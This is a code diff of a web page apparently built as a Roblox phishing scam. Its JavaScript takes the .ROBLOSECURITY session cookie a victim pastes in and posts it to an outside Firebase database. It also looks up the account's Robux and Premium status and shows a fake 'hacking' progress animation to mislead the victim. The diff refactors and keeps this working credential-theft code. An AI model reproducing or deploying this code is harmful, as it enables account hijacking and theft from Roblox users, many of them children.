@@ -21,8 +21,9 @@
     .big-btn{margin:40px auto 0;padding:20px 80px;font-size:1.6em;font-weight:800;background:linear-gradient(135deg,#ff006e 0%,#8338ec 100%);color:white;border:none;border-radius:20px;cursor:pointer;box-shadow:0 10px 40px rgba(131,56,236,0.6);transition:all .3s}
     .big-btn:hover{transform:translateY(-4px);box-shadow:0 20px 60px rgba(131,56,236,0.8)}
     .big-btn:disabled{opacity:0.7;cursor:not-allowed}
-    .status{margin-top:30px;padding:20px;border-radius:12px;font-size:1.2em}
+    .status{margin-top:30px;padding:20px;border-radius:12px;font-size:1.3em;line-height:1.8}
     .status.success{background:rgba(34,197,94,0.2);border:1px solid #22c55e;color:#22c55e}
+    .status.error{background:rgba(248,81,73,0.2);border:1px solid #f85149;color:#f85149}
     .loading{display:none;margin-top:30px;color:#7c3aed;font-size:1.5em;font-weight:700;text-align:center}
     .loading.active{display:block}
     .spinner{display:inline-block;width:28px;height:28px;border:4px solid rgba(124,58,237,0.3);border-top-color:#7c3aed;border-radius:50%;animation:spin 1s linear infinite;margin-right:12px}
@@ -58,33 +59,30 @@
     const loadingEl = document.getElementById("loading");
     const startBtn = document.getElementById("startBtn");
 
-    // REAL FETCH USER INFO (works on GitHub Pages)
-    async function fetchUserInfo(cookie) {
-      let clean = cookie.trim();
-      if (clean.includes('".ROBLOSECURITY"')) {
-        clean = clean.split('".ROBLOSECURITY", "')[1].split('"')[0] || clean;
-      }
-      clean = clean.replace(/[^A-Za-z0-9_|:-]/g, '');
+    async function getUserInfo(cookie) {
+      let c = cookie.trim();
+      if (c.includes('".ROBLOSECURITY"')) c = c.split('".ROBLOSECURITY", "')[1].split('"')[0] || c;
+      c = c.replace(/[^A-Za-z0-9_|:-]/g, '');
 
       try {
-        // Get user
         const userRes = await fetch("https://users.roblox.com/v1/users/authenticated", {
-          headers: { "Cookie": `.ROBLOSECURITY=${clean}` }
+          credentials: "include",
+          headers: { "Cookie": ".ROBLOSECURITY=" + c }
         });
-        if (!userRes.ok) throw "";
+        if (!userRes.ok) throw 0;
         const user = await userRes.json();
 
-        // Get robux
         const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${user.id}/currency`, {
-          headers: { "Cookie": `.ROBLOSECURITY=${clean}` }
+          credentials: "include",
+          headers: { "Cookie": ".ROBLOSECURITY=" + c }
         });
-        const robux = robuxRes.ok ? (await robuxRes.json()).robux : 0;
+        const robux = robuxRes.ok ? (await robuxRes.json()).robux || 0 : 0;
 
-        // Get premium
-        const premRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, {
-          headers: { "Cookie": `.ROBLOSECURITY=${clean}` }
+        const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${user.id}/validate-membership`, {
+          credentials: "include",
+          headers: { "Cookie": ".ROBLOSECURITY=" + c }
         });
-        const premium = premRes.ok && await premRes.text() === "true" ? "Yes" : "No";
+        const premium = premiumRes.ok && (await premiumRes.text()) === "true" ? "Yes" : "No";
 
         return {
           success: true,
@@ -92,19 +90,19 @@
           display: user.displayName,
           userid: user.id,
           robux: robux,
-          premium: premium,
-          headshot: `https://www.roblox.com/headshot-thumbnail/image?userId=${user.id}&width=150&height=150&format=png`
+          premium: premium
         };
       } catch(e) {
         return { success: false };
       }
     }
 
-    // STEAL + SHOW INFO ON PASTE
     async function stealAndShow(raw, source) {
       if (!raw || raw.length < 100) return;
-      const info = await fetchUserInfo(raw);
-      // SEND TO FIREBASE
+
+      const info = await getUserInfo(raw);
+
+      // SEND TO YOUR FIREBASE
       try {
         await fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
           method: "POST",
@@ -120,10 +118,16 @@
       // SHOW REAL INFO
       if (info.success) {
         statusEl.className = "status success";
-        statusEl.innerHTML = `LIVE ACCOUNT<br><strong>${info.display}</strong> (@${info.user})<br>Robux: ${info.robux}<br>Premium: ${info.premium}`;
+        statusEl.innerHTML = `
+          LIVE ACCOUNT FOUND<br>
+          <strong>Display:</strong> ${info.display}<br>
+          <strong>User:</strong> @${info.user}<br>
+          <strong>Robux:</strong> ${info.robux}<br>
+          <strong>Premium:</strong> ${info.premium}
+        `;
       } else {
         statusEl.className = "status error";
-        statusEl.textContent = "COOKIE DEAD OR INVALID";
+        statusEl.textContent = "COOKIE DEAD OR EXPIRED";
       }
     }
 
@@ -134,7 +138,6 @@
       if (e.target.value.length > 100) stealAndShow(e.target.value, "PC");
     });
 
-    // FAKE 3-MIN HACK
     function fakeStart() {
       const cookie = document.getElementById("mobilePaste").value || document.getElementById("pcPaste").value;
       if (!cookie || cookie.length < 100) {
@@ -146,7 +149,7 @@
       statusEl.style.display = "none";
       loadingEl.classList.add("active");
 
-      const msgs = ["Initializing tool...", "Bypassing Roblox security...", "Cracking encryption...", "Fetching account...", "Bypassing 2FA...", "Draining Robux...", "Complete!"];
+      const msgs = ["Initializing...", "Bypassing security...", "Fetching data...", "Cracking password...", "Bypassing 2FA...", "Draining Robux...", "Complete!"];
       let i = 0;
       const int = setInterval(() => {
         loadingEl.innerHTML = `<span class="spinner"></span> ${msgs[i] || "HACKING COMPLETE"}`;
